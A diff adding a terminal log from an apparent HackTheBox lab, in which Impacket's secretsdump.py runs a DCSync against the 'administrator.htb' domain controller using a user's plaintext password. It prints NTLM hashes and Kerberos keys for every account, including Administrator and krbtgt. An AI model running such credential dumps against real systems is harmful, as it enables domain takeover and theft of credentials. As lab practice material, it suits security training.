@@ -1,0 +1,51 @@
+(myenv) ➜  examples git:(main) ✗ py secretsdump.py   'Administrator.htb/ethan:limpbizkit'@'dc.administrator.htb'  
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
+krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
+krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
+administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
+administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
+administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
+administrator.htb\michael:aes256-cts-hmac-sha1-96:928fc39c3cd7d495691c26676329bb6753cb775537f6181b7813e36c3fa03a13
+administrator.htb\michael:aes128-cts-hmac-sha1-96:00d7629b9631ff8661bcbd842ac179ce
+administrator.htb\michael:des-cbc-md5:b06bbf49c49867d3
+administrator.htb\benjamin:aes256-cts-hmac-sha1-96:c0e6eaa8e841c72e55ef6a938565403e27aa728f5397e75d8cae6cd3423957bd
+administrator.htb\benjamin:aes128-cts-hmac-sha1-96:3e8b0ff2f07fd2178ec4d33f1ad0bc4b
+administrator.htb\benjamin:des-cbc-md5:4a4aa4e3bc5eab61
+administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
+administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
+administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
+administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
+administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
+administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
+administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
+administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
+administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
+administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
+administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
+administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
+DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
+DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
+DC$:des-cbc-md5:f483547c4325492a
+[*] Cleaning up... 
+(myenv) ➜  examples git:(main) ✗ 
+
